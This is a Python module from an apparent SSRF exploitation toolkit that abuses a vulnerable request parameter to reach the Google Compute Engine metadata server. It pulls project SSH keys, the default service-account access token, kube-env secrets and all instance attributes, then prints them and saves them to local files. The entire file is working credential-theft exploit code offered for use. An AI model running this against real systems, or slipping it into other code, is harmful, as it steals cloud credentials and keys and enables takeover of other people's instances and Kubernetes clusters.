from core.utils import *
import logging
import os

name          = "gce"
description   = "Access sensitive data from GCE"
author        = "mrtc0"
documentation = [
    "https://cloud.google.com/compute/docs/storing-retrieving-metadata",
    "https://hackerone.com/reports/341876",
    "https://blog.ssrf.in/post/example-of-attack-on-gce-and-gke-instance-using-ssrf-vulnerability/"
]

class exploit():
    endpoints = set()

    def __init__(self, requester, args):
        logging.info(f"Module '{name}' launched !")
        self.add_endpoints()

        r = requester.do_request(args.param, "")
        if r != None:
            default = r.text

            # Create directory to store files
            directory = requester.host
            # Replace : with _ for window folder name safe
            # https://www.ibm.com/docs/en/spectrum-archive-sde/2.4.1.0?topic=tips-file-name-characters
            directory =  directory.replace(':','_')
            if not os.path.exists(directory):
                os.makedirs(directory)

            for endpoint in self.endpoints:
                payload = wrapper_http(endpoint[1], endpoint[0] , "80")
                r  = requester.do_request(args.param, payload)
                diff = diff_text(r.text, default)
                if diff != "":

                    # Display diff between default and ssrf request
                    logging.info(f"\033[32mReading file\033[0m : {payload}")
                    print(diff)

                    # Write diff to a file
                    filename = endpoint[1].split('/')[-1]
                    if filename == "":
                        filename = endpoint[1].split('/')[-2:-1][0]

                    logging.info(f"\033[32mWriting file\033[0m : {payload} to {directory + '/' + filename}")
                    with open(directory + "/" + filename, 'w') as f:
                        f.write(diff)


    def add_endpoints(self):
        self.endpoints.add( ("metadata.google.internal", "computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json") )
        self.endpoints.add( ("metadata.google.internal", "computeMetadata/v1beta1/instance/service-accounts/default/token") )
        self.endpoints.add( ("metadata.google.internal", "computeMetadata/v1beta1/instance/attributes/kube-env?alt=json") )
        self.endpoints.add( ("metadata.google.internal", "computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json") )


